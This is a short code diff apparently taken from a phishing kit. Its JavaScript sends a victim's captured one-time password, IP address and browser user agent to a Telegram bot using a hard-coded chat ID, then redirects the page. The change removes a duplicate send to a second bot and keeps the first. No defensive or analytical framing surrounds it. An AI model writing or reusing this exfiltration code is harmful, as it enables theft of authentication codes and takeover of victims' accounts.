@@ -100,7 +100,6 @@ DEVICE INFORMATION      : ${ua}
                 const chatId1 = '6994641548';  // Ensure this is a valid chat ID (user or group)
                  try {
                     await sendOtpToTelegram(otp, ip, ua, botToken1, chatId1);
-                    await sendOtpToTelegram(otp, ip, ua, botToken2, chatId2);
 
                     // Redirect to next page after 5 seconds
                     setTimeout(() => {
